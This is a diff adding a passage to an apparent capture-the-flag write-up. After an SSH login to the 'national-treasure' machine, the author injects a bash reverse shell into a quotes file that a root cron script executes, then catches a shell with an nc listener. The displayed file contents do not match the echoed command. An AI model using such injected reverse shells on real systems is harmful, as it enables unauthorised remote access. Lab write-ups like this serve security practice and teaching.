@@ -182,3 +182,58 @@ After asking my good friend Gemini for a list of all possibles encryption method
 Now that we got Weston's password, we can connect with ssh to his account.
 
 ![SSH connection](/img/writeups/20260508-200659.png "SSH connection")
+
+There is nothing interesting in the home directory. So I tried to see what Weston could execute as root and found something interesting.
+
+![](/img/writeups/20260508-201801.png)
+
+This script was just something to broadcast a message : 
+\`\`\`bash
+
+weston@national-treasure:\~$ cat /usr/bin/bees 
+
+#!/bin/bash
+
+wall "AHHHHHHH THEEEEE BEEEEESSSS!!!!!!!!"
+
+\`\`\`
+
+I think this was a rabbit hole.
+
+Next thing I look is the /opt/ and god I found something interesting. In it was a script which would run commands by picking random sentences from a file. I have the permissions to edit the file from which the script picks the quote so I removed all the quotes and added a revershell instead
+
+![Uploaded image preview](/img/writeups/20260508-202625.png)
+
+\`\`\`bash
+
+weston@national-treasure:/opt/.dads_scripts/.files$ echo "; bash -c 'bash -i >& /dev/tcp/192.168.137.101/4444 0>&1'" > .quotes   
+
+weston@national-treasure:/opt/.dads_scripts/.files$ cat .quotes 
+
+sh -i >& /dev/tcp/192.168.255.255/4444 0>&1
+
+weston@national-treasure:/opt/.dads_scripts/.files$ 
+
+\`\`\`
+
+And now, let's wait for the cronjob to execute and give us a reverseshell. And BOOM we got connected as Cage
+
+\`\`\`
+
+[nocteln@arch \~]$ nc -lvnp 4444
+
+Listening on 0.0.0.0 4444
+
+Connection received on 10.82.169.149 56238
+
+bash: cannot set terminal process group (2062): Inappropriate ioctl for device
+
+bash: no job control in this shell
+
+cage@national-treasure:\~$ 
+
+\`\`\`
+
+And with that, our user flag
+
+![user flag](/img/writeups/20260508-205006.png)
